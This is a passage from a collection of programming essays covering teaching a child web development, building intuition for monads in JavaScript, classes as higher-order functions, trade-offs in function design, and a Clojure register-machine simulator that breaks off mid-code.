2.  Moved to HTML & CSS. Made a blog, a news site, a tic tac toe board,
3.  Showed him how to deploy sites to firebase, so he could show his
    friends
4.  Could stomach some codecademy + youtube lessons, to learn some
    basics of javascript: strings, arrays, etc
5.  Guided him through a simple tutorial: given an input, take the value
    and make it the background color. This was one of the few times I
    actually sat down with him. He could use the ideas there to build a
    bunch more stuff
6.  He started building a bunch of javascript-enabled sites: cooler
    blogs, a todo app, an anime app, some school projects, etc
7.  Eventually, the curiosity came: how can I save data?
8.  Showed him how to use firebase. He went on a spree after that: built
    tic tac toe, snake, anime chat, etc
9.  Eventually, he expressed an interest in python. I challenged him to
    make a text-based twitter bot
10. He wanted to turn it into an app, so he started playing with flask.
    I walked him through deploying it to Heroku
11. Now he's interested in building animusic: an app to let you list
    your favorite songs in anime.

------------------------------------------------------------------------

*Note, at some point, I may build something to help kids learn like
this. If you're interested in that, follow me on twitter* --- will
announce if I do anything there : }

------------------------------------------------------------------------

*Thanks Joe Averbukh, Daniel Woelfel, Ilia Parunashvili, Nino
Parunashvili, Alex Reichert for reviewing drafts of this essay*

\(1\) If you're a hacker you may notice some glaring security
vulnerabilities. Please leave them alone, or if you like, hack with jest
:}. Think a lesson on security will get in the way for now

\(2\) Some environments, like Roblox, could be great: the motivation is
real (wow I can make a real game), and what they learn is real (Lua).
One of my other nephews is playing with this, let's see how it goes : }

# Inventing Monads

I got into a discussion about monads recently. On a search to find some
resources to share, I realized that most essays explained them with type
signatures and rules. A missing ingredient to grok them, I think, is to
understand the intuition behind them. How could you end up *inventing*
monads?

Okay, let's try to build that intuition. We'll avoid both types and
category theory.

## Problem

Say you have a few functions to get a user, a profile, and a display
picture:

\[code\]

    function getUser(id) { 
      return USERS[id] 
    }

    function getProfile(user) { 
      return user.profile
    }

    function getDisplayPicture(profile) { 
      return profile.displayPicture
    }

\[/code\]

Now, given an id, how would you get the profile picture?

You could write this:

\[code\]

    getDisplayPicture(getProfile(getUser(id)))

\[/code\]

Buut, this would throw an error: all these functions *could* return
null. If `getUser` returned null for example, you would see:

\[code\]

    Uncaught TypeError: Cannot read property 'profile' of undefined

\[/code\]

To fix this, you may end up writing something like this:

\[code\]

    function getDisplayPictureFromId(id) { 
      const user = getUser(id)
      if (!user) return
      const profile = getProfile(user)
      if (!profile) return
      return getDisplayPicture(profile)
    }

\[/code\]

But, this is getting pretty ugly. All these conditional returns distract
from what you're really trying to do. **What if there was a way to get
rid of these conditionals?**

## Chainer

So, that's our challenge: let's get rid of these conditionals. One way
we can do this, is to make some kind of helper. This helper would let us
chain these functions together:

\[code\]

    new Chainer(getUser(id))
      .whenExists(user => getProfile(user))
      .whenExists(profile => getDisplayPicture(profile))

\[/code\]

This looks pretty good. Let's implement it.

### whenExists

`.whenExists` would only run the callback if the value exists. Here's
how you could write this:

\[code\]

    class Chainer {
      constructor(v) { 
          this.value = v
      }
      whenExists(f) { 
          if (!this.value) return this;
          return new Chainer(f(this.value))
      }
    }

\[/code\]

And voila, with just this, we can now write

\[code\]

    function getProfilePictureFromId(id) { 
      return new Chainer(getUser(id))
        .whenExists(user => getProfile(user))
        .whenExists(profile => getDisplayPicture(profile))
    }

\[/code\]

### More Problems

Notice that `getDisplayPictureFromId` now returns a `Chainer`.

Imagine we had another function `resizeDisplayPicture`, that *also*
returned a Chainer

\[code\]

    function resizeDisplayPicture(pic) { 
        return new Chainer(pic).whenExists(pic => ...
    }

\[/code\]

What would happen, if we wrote:

\[code\]

    getProfilePictureFromId(id).whenExists(pic => resizeDisplayPicture(pic))

\[/code\]

Let's look at whenExists again:

\[code\]

    whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
    }

\[/code\]

If `getProfilePictureFromId(id)` did exist, we would run

\[code\]

    new Chainer(f(this.value))

\[/code\]

which in this case is

\[code\]

    new Chainer(resizeDisplayPicture(this.value)) 

\[/code\]

Which becomes

\[code\]

    new Chainer(new Chainer(this.value)...

\[/code\]

**Uh oh. We now have a Chainer inside of a Chainer.** Ideally, we'd want
a function that somehow "merged" these chainers together.

### whenExistsMerge

So let's do that. We can call it `whenExistsMerge`

\[code\]

    class Chainer {
      constructor(v) { 
          this.value = v
      }
      whenExists(f) { 
          if (!this.value) return this;
          return new Chainer(f(this.value))
      }
      whenExistsMerge(f) { 
          if (!this.value) return this;
          return f(this.value)
      }
    }

\[/code\]

And with that, we can write

\[code\]

    getProfilePictureFromId(id)
      .whenExistsMerge(pic => resizeDisplayPicture(pic))
      .whenExists(resizedPic => ...)

\[/code\]

## Eureka

**Aand voila, you've just invented a specific type of monad.** Kind of
(1). Chainer is analogous to the `Maybe` monad. `whenExists` is
analogous to its `fmap` operation, and `whenExistsMerge` is analogous to
its `bind` operation. If you're curious about the type-based
technicalities now, [see this
essay](http://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html).

## More uses

So, now we've found this cool `Chainer`. We can stop here, or think a
bit further. What's so special about it?

Well, it's like a box that wraps around some information. We can
interact with that box with `whenExists` and `whenExistsMerge`.

How else can we use the idea of `box` and `whenExists?`

Here's one. Let's say you were dealing with callback hell:

\[code\]

    fetchUser(id, (err, user) => {
      if (err) ... 
        fetchProfile(profile, (err, profile) => { 
          if (err) ...
            fetchDisplayPicture(...
        }
    }

\[/code\]

What if we created something like an `Async Chainer`: it stores the
result of some future computation. Then, you could use the `whenExists*`
functions, which let you interact with the value *when* it is computed.
We turn the callback hell into

\[code\]

     fetchUser(id).whenExistsMerge(fetchProfile).whenExistsMerge(fetchDisplayPicture)

\[/code\]

Well, replace `whenExistsMerge` with `then`, and you\'re on a road to
discover `Promise`, which is also a monad. Kind of (2).

## Abstract all the way

Now, it's pretty cool to notice that both the nullable use case and the
async use case have the same interface. The name `whenExists` may be a
bit too specific. Really, what it does is give you an interface to `map`
over the value. If you use the word `map`, `whenExistsMerge` really lets
you `flatMap` over the value.

This begins to get us to the fundamental abstraction of a monad: a box,
with an interface for `map`, and `flatMap`. As you look deeper, you'll
notice that this abstraction can handle a lot of other things. If you're
curious, research the `Result` monad for example.

## Fin

And with that, you've invented monads : )

### Aside: Do you *really* need this?

As you went through this, you may have realized that there are other
ways to solve the problems that monads solve. Instead of `Chainer`, your
language could have a [safe
call](https://kotlinlang.org/docs/reference/null-%20safety.html#safe-calls)
abstraction. Instead of `Promise`, your language could have an
`async/await` abstraction. Sometimes those can be a better [better
choice](https://www.youtube.com/watch?v=YR5WdGrpoug). Nevertheless, if
your language doesn't have those abstractions, you can use monads to
solve them. And of course, like any powerful abstraction, you can invent
new monads to simplify your business logic.

------------------------------------------------------------------------

\(1\) I cheated a bit with `Chainer`, by avoiding the subtypes `Just`
and `Nothing`. This makes it so you can't express something like
`Just(null)`. Still, it gets at the essence : )

\(2\) Likewise, `Promise` isn't quite a monad, because it mixes both
`flatMap` and `map` with `then`. This makes it so you can't have a
`Promise<Promise<Res>>`. Again though, it gets at the essence

*Thanks to Joe Averbukh, Mark Shlick, Daniel Woelfel, Irakli Safareli,
Jacky Wang for reviewing drafts of this essay*

# Classes are just a fancy way of writing higher order functions

Joe and I recently [kicked off a re-read of
SICP](https://twitter.com/stopachka/status/1295411936625074178). I can
say that it is *the* most interesting textbook I have gone through.
Imagine, you begin with just 4 or 5 constructs, and you end up building
algebraic equation solvers, circuit simulators, and even logic
programming languages. Because you start off with such few constructs,
the added benefit is that you begin to see the fundamentally simple,
shared essence in programming.

I wanted to give you one example that surprised me in the book. We tend
to think that **classes belong in a** **fundamentally different
category** **from functions.**

But are they so different?

For example, let's say we have a class like this:

\[code\]

    class Person { 
      constructor(firstName, lastName) {
        this.fName = firstName; 
        this.lName = lastName;
      }
      getFullName() { 
        return this.fName + ' ' + this.lName;
      }
      setFirstName(firstName) {
        this.fName = firstName;
      }
    }

\[/code\]

Well, if we think about it, this is really just a higher order function.
a `Person` higher order function accepts arguments (constructor), and
returns a list of functions that can manipulate those arguments
(methods). We could write `Person` like this:

\[code\]

     function Person(firstName, lastName) {
      let fName = firstName; 
      let lName = lastName;

      function getFullName() { 
        return fName + ' ' + lName;
      }
      
      function setFirstName(firstName) { 
        fName = firstName
      }

      return function(method) { 
        switch (method) { 
          case 'getFullName': 
            return getFullName;
          case 'setFirstName': 
            return setFirstName;  
        }
      }
    }

\[/code\]

Now,

\[code\]

    const person = new Person("Ben", "Bitdiddle")
    person.getFullName()

\[/code\]

becomes

\[code\]

    const person = Person("Ben", "Bitdiddle")
    person('getFullName')()

\[/code\]

Here, instead of invoking a method, we are "passing" a message. This is
why by the way, many classic OO folks talk about object orientation
really being about message passing.

Yup, really. Classes are just higher order functions, which accept
arguments (constructor) and return a list of functions that can
manipulate those arguments (methods).

When you previously thought two concepts were different, but they turn
out to be the same, you're ripe to discover new ideas: you can find the
deeper abstractions between them, apply ideas from across those
seemingly different categories, and move between concepts more fluidly.
So, not only are epiphanies like this fun, but they're much more useful
than you'd think.

If you liked this, there are a *ton* of similar epiphanies in the
textbook. To experience it best, I suggest picking a partner and working
through the book together.

*Thanks to Daniel Woelfel, Alex Reichert, Jacky Wang for reviewing
drafts of this essay*

# Crafting Functions

We write so many functions in our programs that they become second
nature before we know it. Like ants in a colony, they are numerous
beyond imagination and they come together to form some surprisingly
complex systems.

It begs the question: how do we write good functions? It can seem
trivial: they're just like ants after-all. But there is leverage in the
answer: the right decisions multiply throughout your codebase and bubble
up into great design.

I think there are about three key ideas you can employ to craft good
functions. I wanted to share them with you.

## Export

Let's start with an example. We have an app, and we want to export some
data in a JSON format. Here's what a function for that could look like:

\[code\]

    function exportFile() { 
      setLoading(true);
      try {
        const data = getData(); // [Data, Data, Data]
        const exportableData = toExportableData(data); // ExportableData
        const jsonStr = JSON.stringify(exportableData); // '{"data": {...
        const fileURL = saveFile("export.json", jsonStr); // https://foo.com/export.json
        setFileURL(fileURL);
      } finally {
        setLoading(false)
      }
    }

\[/code\]

Seems straight forward: To export as JSON, we first get our data. Now,
this data may have some sensitive info, so we clean that up and
transform into something exportable; ExportableData. Once we have that,
we get a string representation, save the file, and badabing, badaboom,
we're done.

Okay, we've got something working well.

## A new requirement

But life moves on and our program needs to evolve. Instead of just
exporting JSON, we need to do more: **we also need to export a CSV
file**.

How do we do that?

The first thing we notice, is that exporting a CSV is very similar to
exporting JSON. Can we abstract `exportFile`?

## Idea 1: Configuration

One thing we can do, is to introduce a new flag: something like
`exportFile(/*isCSV=*/ true)`

\[code\]

    function exportFile(isCSV) { 
      ...
      let fileURL
      if (isCSV) { 
        const csvStr = toCSVStr(exportableData)
        fileURL = saveFile("export.csv", csvStr);
      } else { 
        const jsonStr = JSON.stringify(exportableData);
        fileURL = saveFile("export.json", jsonStr);
      }
      ...

\[/code\]

By introducing this flag, we can conditionally produce a different
`fileURL`: one for CSV and one for JSON. With that we see the first
concept for abstraction: configuration. You pass some configuration, and
you leave it to your function to figure what to do.

So, is it a good idea?

### The key *advantage* is that our logic is centralized.

With configuration, the caller is limited in what they can do: they can
only provide flags. All the true logic stays inside `exportFile`. This
means that callers of the function can't go crazy and do something
unsupported. And that could give us some peace of mind.

### The key *disadvantage* is that...our logic is centralized.

This will work, but let's think about it. First, notice that in order to
understand `exportFile` now, we need to understand both the CSV and JSON
case. Imagine if someone opens up `exportFile` to figure out what it
does: if they *only* cared about JSON, they now have to understand more
logic than they needed. Anyone who changes the logic for CSV, may also
end up breaking JSON. **`exportFile`** **has become**
[**complected**](https://www.infoq.com/presentations/Simple-Made-Easy/)
**.**

Notice also, that because the caller of this function can *only* provide
flags, their hands are tied for use-cases that you didn't support. This
was supposed to give you peace of mind, but it certainly can frustrate
callers. imagine if they wanted to support XML, what could they do?
They'd have to edit `exportFile` to support this case. (God forbid they
edit it to be something like `exportFile(isCSV, isXML)` --- now you have
invariant conditions on your hands). By being so specific, you've chosen
to make your function less abstract --- this of course means that it is
less powerful. **`exportFile`** **has become hard to extend**

### For better or worse, configuration gives the caller the least amount of

power

If you imagine a sort power spectrum, where the caller has the least
power on the left, and most power on the right, configuration would be
on the left. You control what the caller does so tightly that it gives
your certainty, but makes your function more complex and less useful.

Say you wanted to address the problems, and move to the right of this
spectrum, what could you do?

## Idea 2: Inversion

Well, if you look at what we wrote, we can notice that the only part
that is *really* different, is the bit about taking `exportData`, and
creating a `fileURL`.

\[code\]

    ...
    const exportableData = toExportableData(data); // ExportableData
    ... // *This can be different! Somehow we need to get a fileURL* 
    setFileURL(fileURL);
    ...

\[/code\]

So one thing we can do is this: instead of providing a flag, we can
provide a function:

\[code\]

    function exportFile(exportableDataToFileURL) { 
      setLoading(true);
      try {
        const data = getData(); // [Data, Data, Data]
        const exportableData = toExportableData(data); // ExportableData
        const fileURL = exportableDataToFileURL(exportableData)
        setFileURL(fileURL);
      } finally {
        setLoading(false)
      }
    }

\[/code\]

Now, for JSON, we can write

\[code\]

    exportFile((exportableData) => { 
      return saveFile("export.json", JSON.stringify(exportableData));
    })

\[/code\]

and for CSV we can write:

\[code\]

    exportFile((exportableData) => { 
      return saveFile("export.csv", toCSVStr(exportableData));
    })

\[/code\]

Oky doke, this is cool.

### The key *advantage* is that you give the caller more power

With this we solve both of the problems we had with configuration. Now
if someone looks under the hood at `exportFile`, they won't see
unrelated code about csv. If they wanted to extend to XML, they can
simply provide a different function. We've given the caller much more
power

### The key *disadvantage* is that it can be either too powerful or not

powerful enough

We've abstracted further, but there is a price there. The first is, that
we *think* we know that what we *really* need to pass outwards is
`exportableData`, and what we need to return is a `fileURL`. What if we
were wrong? For example, some may need a slightly different data format
--- instead of `exportableData` they need
`someOtherKindOfExportableData`. By the time we figured that out, it's
possible that there are numerous new usages of `exportFile`, which we'll
have to support as we evolve this function.

One way we could have prevented this, is to have stuck with
configuration. This way, anyone who wanted to support something would
have to funnel through this function, which would give us time to think
about what the best abstraction was.

Another way, would have been if this function was abstracted even
further, so callers could have easily supported
`someOtherKindOfExportableData`.

### Inversion lies in the middle of the power spectrum

Inversion is more powerful than configuration, but it's not the most
powerful method. This can be a great choice, but you risk either being
too powerful and exposing errors, or not being powerful enough and
restricting callers.

We know the less powerful option: configuration. What would the most
powerful one look like?

## Idea 3: Composition

The next thing we may notice, is that our `exportFile` function is
actually built up some building blocks that could be useful for a bunch
of different things. For example, many functions may want a loading
state, or just need to get `exportableData`, etc. We could create those
building blocks:

\[code\]

    function exportJSONFile() { 
      withLoading(() => saveJSONFile(getExportableData()))
    }


    function exportCSVFile() { 
      withLoading(() => saveCSVFile(getExportableData()))
    }

\[/code\]

### The key advantage is that the user gets the most power

The building blocks that we just built, can be used in a myriad of ways.
The user can support CSV, XML, can use `isLoading` with some other
function, and choose to provide a different kind of `exportableData`.
We've provided a lot of power for the user.

### The key disadvantage is that you are the most vulnerable to mistakes

The disadvantage though, like in the case of inversion, is that we open
ourselves up to a lot of mistakes. What if `isLoading` was really meant
for files, and other things should have been using a different flag?
What if people start using `saveJSONFile`, and pass data that wasn't
really an export? These are all cases that we have implicitly allowed
with our abstractions.

There's a further problem: notice that with our first example of
`exportFile`, you the code was more concrete: you could see what was
actually happening. When code is more abstract, it's a bit harder to
reason about what is *actually* happening. Now, it can be worth it for
the power gains, but if you optimized prematurely, you're just paying
this price for nothing. An example of this unnecessary price is
`saveJSONFile` and `saveCSVFile` --- if we had
[inlined](http://number-none.com/blow/john_carmack_on_inlined_code.html)
those, the overall composition would still be abstract but more
understandable. These are the kind of things to watch out for as you
abstract at this level.

### Composition is at the end of the spectrum

And with that, we see that composition gives us the most power, but
gives us the most opportunities to shoot ourselves in the foot. Boy can
it be worth it though.

## Continuum

It's funny to notice that with each option, the pro *is* the con. So how
do we pick? I think one heuristic you can use is this: pick the most
powerful option you can limited by your confidence. For example, if you
have a light understanding of the problem, stay on the lower side of the
abstraction spectrum. As you understand more (say, time to introduce
XML) you can evolve to the powerful side of the spectrum. When you're
*very* confident, and you can see good use-cases for your building
blocks, lean to the most powerful side of the spectrum.

*Thanks to Daniel Woelfel, Alex Reichert, Julien Odent for reviewing
drafts of this essay*

# Simulating Machines in Clojure

[My cofounder Joe and I recently finished
SICP.](https://twitter.com/stopachka/status/1295411936625074178) It was
a mind-bending experience: you start from just 3 concepts, and you
recursively build up algebraic equation solvers, circuit simulators, 4
interpreters, and a compiler.

At some point you experience a visceral feeling: If you were dropped in
a forest...you could create your own computer. The project that
contributed most significantly to this feeling was creating a machine
simulator.

We diverged from the book by writing the simulator in Clojure rather
than Scheme. Immutable data structures and higher-level concepts
available to us in Clojure compressed the solution, to the point where I
think you can build your own in a few days worth of hacking.

This essay will guide you through doing just that: let's build a machine
simulator, over a good few days worth of hacking! I hope this inspires
you to play with Clojure and to take a deeper look at SICP.

## Concrete Machine

Before we simulate general machines, let's think about a concrete
machine. **How could we create a machine that could figure out
factorials?**

If we were writing code, factorial could look something like this:

\[code\]

    (defn factorial [n]
      (loop [res 1
             counter 1]
        (if (> counter n)
          res
          (recur
            (* counter res)
            (inc counter)))))

\[/code\]

Let's see if we could build factorials using *physical* devices.

## A: Storing Numbers

Well, we need a way to keep track of `counter`, `res`, and `n`. To do
that, we'll need a device that stores information.

### Bulbs

Imagine a device that has some light bulbs inside of it.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwNDUyLTFlNzkzODgwLTA3ZTgtMTFlYi04MjI4LWQwYzE4ZTcwNTZhYS5wbmc)

We can say that if a light bulb is *on,* that represents the number 1,
and if a light bulb is *off* that represents the number 0.

If we had a bunch of light bulbs in the device, we could interpret the
state of these bulbs as larger and larger binary numbers. The light
bulbs in the device I just showed you for example, would represent
"10101", which is binary for "21".

### Incoming Current

Now, imagine that at all times there are a bunch of other wires
connected to this device. These wires carry "new" charges for the light
bulbs, but with a twist: the incoming charges *do not* affect the light
bulbs inside just yet.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwNjIxLTVhMTQwMjgwLTA3ZTgtMTFlYi05ZjM2LTU2MDFkZTIyOWUwOS5wbmc)

Notice how the *incoming charge* for the "a" light bulb is "off", but
the bulb inside is still on. Conversely, the incoming charge \"b\" is
\"on\", but the bulb is off. If our device can do this, it means that
whatever the charges for the light bulbs are inside is a *stored value*.
Very cool!

### Save

Now, we need these incoming wires to do something at some point. What if
this device had a "save" button.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwNjQ1LTYzMDRkNDAwLTA3ZTgtMTFlYi04NjVjLWE3YTg3OTE5Njg3ZC5wbmc)

Once we pressed "save", the incoming current would transfer inside the
box:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwNjU0LTY3Yzk4ODAwLTA3ZTgtMTFlYi04MjU1LTExNmEzMGUxNTcwMy5wbmc)

Here, light bulb "a" changes from "on" to "off", and the light bulb
\"b\" changed from \"off\" to \"on\".

Great, now we have a way to "save" new numbers inside!

### Outgoing current

We also need a way to share the state of what's inside to other devices.
All we'd need to do to make that work, is to have a bunch of wires that
leave our device, which carry the sames charges as the light bulbs:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUxNzQ2LWY5ODVjNTAwLTA3ZTktMTFlYi05YzczLTY4ZWYwNzc3OGJlMi5wbmc)

Now, if we hooked those outgoing charges to some other device, that
device would receive the "number" that was stored in this one.

### Registers

What we just described is analogous to a computer's *register* (1).
Registers let us store and share information.

Now, we could use three registers to store the value of `res` `counter`
and `n`.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwODUxLWIxYjI2ZTAwLTA3ZTgtMTFlYi04NzRjLTQxODgyODAxNTQ2OC5wbmc)

## B: Adding Numbers

Next up, we'll need a device that that can "add" two registers. Imagine
a device that had two register's worth of incoming wires, and one
register's worth of outgoing wires:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwODY5LWI4ZDk3YzAwLTA3ZTgtMTFlYi05ZDM0LTQwMDE0YmQ5NDAyOC5wbmc)

### Adder

If the device could connect those incoming wires in such a way, that the
outgoing wires represented the "addition" of those registers, we'd have
an "adder" device!

In the example above, the left register represents "10101" (21), and the
right represents "00001" (1). The output wires are charged as
"10110"...which represent 22!

## C: Multiplying numbers

Similarly, we could have a device that has two register's worth input
wires, and one register's worth of output wires:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwODkyLWMxMzFiNzAwLTA3ZTgtMTFlYi05OTQ1LTI4ZDljNmU4N2IzNy5wbmc)

### Multiplier

If we could connect the incoming wires in such a way, that the outgoing
wires represent the result of a multiplication, boom we would have a
multiplying device!

The left register above represents "00101" (5), the right register
represents "00010" (2), and the charge of the outgoing wire is "01010"
(10). Nice! That gives us a multiplier machine.

### Comparator

We need one more device. Imagine a device that takes two register's
worth of input wires, and only has *one* output wire:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwOTE1LWNhMjI4ODgwLTA3ZTgtMTFlYi05Y2RiLWM2ZDEwZTYxNzc1Yi5wbmc)

If we could combine the input wires in such a way, that the output wire
was "on" when the left register was bigger, and off otherwise, we could
use this as a comparator machine!

## E: Data Paths

If we had all these machines, we can wire them in such a way, that lets
us compute factorials:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUwOTg1LWRlZmYxYzAwLTA3ZTgtMTFlYi05MDRjLTE2NmUzNTIyMjJkOS5wbmc)

Here, we wired the output wires of `res` and `counter` to the `*`
machine. We wired the output wires of the `*` machine, to *be* the input
wires of `res`.

This way, if we press "A", we would "store" the result of multiplying
`counter` with `res`!

Similarly, we wired up the output wires of `counter` and a register that
keeps the value `1`, to the `+` machine. We wired the output wires of
the `+` machine, to *be* the input wires of `counter`.

Now, If we pressed "B", `counter` would be stored with the result of
adding `1`!

Next up, we also wired up `counter` and `n` with the `>` machine. If we
hooked up a light bulb to the output wire of the `>` machine for
example, then whenever it was on, we would know that `counter` was
larger than `n`.

We've just drawn out the "data path" of our machine.

## F: Controller

### Manual Recipe

Let's remember our code for factorial:

\[code\]

      (loop [res 1
             counter 1]
        (if (> counter n)
          res
          (recur
            (* counter res)
            (inc counter))))

\[/code\]

Imagine if we had our "data path" machine. What would happen if we
followed the following recipe:

1.  Take a look at the output of the `>` machine.
2.  If the light bulb connected to the `>` machine is on, **stop**

*Otherwise...*

1.  \"Press A\". This will update `res` with the result of the `*`
    machine on `res` and `counter`
2.  "Press B". This will update `counter` with the result of the `+`
    machine on `1` and `counter`
3.  Go back up to the start of the recipe

**If we did this over and over again, once the light bulb connected to
the output of the** **`>`** **machine turns on,** **`res`** **would
contain the result of factorial!**

### Automation

Pretty cool, but this kind of manual work would be annoying. If you look
at these instructions though, there's a pretty significant insight: *all
of those instructions are simple: \"look at charge of light bulb\",
\"press button\...\"*

In fact, they're so simple that we could wire up a machine that goes
through that recipe! Imagine if we created a machine that could "press"
buttons for us, depending on whether the output wire of the `>` machine
is on:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUxMDIwLWU5MjExYTgwLTA3ZTgtMTFlYi04MDJlLTI4YzIyNjZiNzQwOC5wbmc)

We would be able to automate computing factorials 🙂

### Balls and Hills

Now, at this stage, you may be wondering: exactly *how* would `*`
produce output wires that represent the multiplication? How would `+`
work, and how would the `controller` move along?

If you think about it, these can all be reduced to very simple machines.
They don't even necessarily have to be electronic:

Imagine you had a ball rolling down some hill. You could construct
something like the `>` machine, by putting `res` and `counter` on a
scale: based on what's bigger, the ball would take a different path

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUxMDQ4LWY4MDdjZDAwLTA3ZTgtMTFlYi04NTg3LWRiYjE2ZDU3NGZkMy5wbmc)

With sufficient energy, space, time, and ingenuity you really could
build all of this with a ball on a hill. Now, you wouldn't necessarily
do that (2), but you can imagine how the electronic parts that make up
our machines are similarly simple, logical machines: *turn on if off,
turn off if on, etc*. These logical machines are called "logic gates".
You can look them up, but hopefully I'll have an essay for you about
these machines soon 🙂.

## Language Simulation

Now, we drew out our machine and saw how we could build them with simple
devices. How could we simulate these machines?

To simulate these machines, we need to transform our *picture
descriptions* into something that computers can manipulate. Computers
can manipulate text much better: let's create a *language* for
describing these machines.

If we remember the pictures again:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUxMTg3LTJmNzY3OTgwLTA3ZTktMTFlYi05ZTNlLTg3Zjg0NDkxZjQxYS5wbmc)

we could transform them into a language that looks like this:

\[code\]

    (def factorial-instructions
      '(
         start

         (test (op >) (reg counter) (reg n))
         (branch (label done))

         (assign res (op *) (reg counter) (reg res))
         (assign counter (op +) (reg counter) (const 1))
         (goto (label start))

         done))

\[/code\]

When the `test` instruction runs, we run the `>` machine with `counter`
and `n`.

Our `branch` instruction checks if the `test` instruction said `yes`. If
it did, it moves to `done`. Otherwise it no-ops and the machine moves
forward by one.

After that, our `(assign res` expression is analogous to "press A".
`(assign counter` is analogous to "press B", and `(goto (label start)`
is analogous to the arrow bringing us back to the start.

With this textual representation, we can build an interpreter and
simulate our machine. Let's do this!

## 0: Machine State

What does the state of our machine look like in Clojure? Well, how do we
represent most things in Clojure? With maps! Let's represent the state
of our machine as a map:

\[code\]

    (def ex-machine-state-v0
      {:registry-map {'n 10 'res 1 'counter 1}
       :label->idx {'start 0 'done 5}})

\[/code\]

`registry-map` could keep a mapping of registers to values. `label→idx`
could keep a mapping of labels to their `idx` in the instruction list

## 1: primitive

With this, we can get the most foundational part of our language to
work: We use `(const…` `(reg...` and `(label…` all over the place.

1.  If our machine sees `(const 1)`, it should return the actual value
    `1`
2.  If our machine sees `(reg foo)`, it should look up whatever is in
    the `foo` register, and return that
3.  If our machine sees `(label foo)`, it should return the correct
    index in our instruction list.

Let's write this out in Clojure:

\[code\]

    (def tag first) ; (tag '(const 1)) => const
    (defn tag-of? [sym s] (= sym (tag s))) ; (tag-of? 'const '(const 1)) => true

    (defn parse-primitive [{:keys [registry-map label->idx] :as machine-state}
                           prim-exp]
      (condp tag-of? prim-exp
        'const
        (second prim-exp)
        'reg
        (get registry-map (second prim-exp))
        'label
        (label->idx (second prim-exp))))

\[/code\]

Our `parse-primitive` function takes the machine-state, and does the
right thing based on the `tag` of the expression.

\[code\]

    (parse-primitive ex-machine-state-v0 '(const 1))
    ; => 1
    (parse-primitive ex-machine-state-v0 '(reg n))
    ; => 10
    (parse-primitive ex-machine-state-v0 '(label done))
    ; => 5

\[/code\]

## 2: operation

Okay, we have primitives working, let's move up a level. Our simulator
gives us access to some other machines, like `*` `+` and `>`

\[code\]

    '(... (op >) (reg counter) (reg n))
    '(... (op *) (reg counter) (reg res))
    '(... (op +) (reg counter) (const 1))

\[/code\]

When our simulator sees these instructions, it'll need to look up the
machine that corresponds to the `op`, and run it with the primitive
arguments that were provided.

To do this, let's evolve our machine-state:

\[code\]

    (def ex-machine-state-v1
      {:registry-map {'n 10 'res 1 'counter 1}
       :label->idx {'start 0 'done 5}
       :op-map {'* * '+ + '> >}})

\[/code\]

We've now introduced `op-map`. This maps `op symbols` to these other
machines.

Now we could implement a function that parses operations:

\[code\]

    (def operation-sym (comp second first)) ; ((op >) ...) => >
    (def operation-args rest) ; ((op >) (reg counter) (reg n)) => ((reg counter) (reg n))

    (defn parse-operation [{:keys [op-map] :as data} op-exp]
      (let [op-fn (get op-map (operation-sym op-exp))
            evaled-args (map (partial parse-primitive data)
                             (operation-args op-exp))]
        (apply op-fn evaled-args)))

\[/code\]

And with that, our simulator can run operations:

\[code\]

    (parse-operation ex-machine-state-v1 '((op >) (reg counter) (reg n)))
    ; => false
    (parse-operation ex-machine-state-v1 '((op *) (reg counter) (reg res)))
    ; => 1
    (parse-operation ex-machine-state-v1 '((op +) (reg counter) (const 1)))
    ; => 2

\[/code\]

## 3: assign

Now it's time to move up even higher, and start implementing our actual
instruction expressions.

Let's start with assign. Assign has two forms. We can either assign a
primitive value:

\[code\]

    (assign counter (const 1)) ; {'counter 1}

\[/code\]

Or the result of an operation:

\[code\]

    (assign counter (op +) (reg counter) (const 1)) ; {'counter 2}

\[/code\]

Once assign completes, our machine state needs to "move forward" to the
next instruction.

To implement assign, we need to evolve our machine state again:

\[code\]

    (def ex-machine-state-v2
      {:registry-map {'n 10 'res 1 'counter 1}
       :label->idx {'start 0 'done 5}
       :op-map {'* * '+ + '> >}
       :idx 0})

\[/code\]

We now have a `idx` state, that tracks the machine's current index in
the instruction list. This will let us "move" forward, by simply
incrementing the index.

Here's how assign can look:

\[code\]

    (def assign-reg-name second) ; (assign foo ...) => foo
    (def assign-operator #(nth % 2)) ; (assign foo (const 1)) => (const 1)

    (def operation-exp?
      (comp (partial tag-of? 'op) assign-operator)) ; (assign foo (op ... => true

